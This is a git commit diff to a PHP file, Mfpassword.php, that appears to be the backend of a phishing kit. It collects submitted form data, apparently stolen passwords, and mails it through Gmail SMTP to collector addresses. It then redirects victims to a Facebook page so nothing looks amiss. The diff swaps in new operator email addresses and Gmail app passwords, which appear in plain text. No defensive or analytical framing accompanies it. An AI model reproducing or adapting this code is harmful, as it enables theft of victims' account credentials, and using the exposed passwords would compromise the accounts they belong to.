24ad389b0705307fd120972ca3ed4739cd8be37e
verifyingse440987 <verifyingservice79@gmail.com>
2025-09-17 23:35:05 +0500

    Update Mfpassword.php

--- Mfpassword.php
+++ Mfpassword.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://case-ccczqz4cd1pfr6008-support.vercel.app/");
+header("Location: https://web.facebook.com/me");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -20,31 +20,32 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
 
 
-   // PHPMailer object creation
+    // PHPMailer object creation
     $mail = new PHPMailer(true);
     try {
         // SMTP settings
         $mail->isSMTP();
         $mail->Host       = 'smtp.gmail.com'; // Replace with your SMTP server address
         $mail->SMTPAuth   = true;
-        $mail->Username   = 'herereplit@gmail.com'; // Replace with your email address
-        $mail->Password   = 'welc oltq mcnf txvn'; // Replace with your email password
+        $mail->Username   = 'official.mitchealmartin@gmail.com'; // Replace with your email address
+        $mail->Password   = 'stbi hwua bspu vgiv'; // Replace with your email password
         $mail->SMTPSecure = 'tls';
         $mail->Port       = 587;
 
 
         // Email properties
-        $mail->setFrom('herereplit@gmail.com', 'Hello DK');
-        $mail->addAddress('teamcyber102@gmail.com');
-       $mail->addAddress('uffemail215@gmail.com');
+        $mail->setFrom('Lernayouamzaxal@gmail.com', 'passss');
+        $mail->addAddress('murkhjaan16@gmail.com');
+        $mail->addAddress('Lernayouamzaxal@gmail.com');
 
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'Abid';
+        $mail->Subject = 'mf';
         $mail->Body = $emailBody; // Set the email body using the collected form data
+
 
         // Send email
         $mail->send();
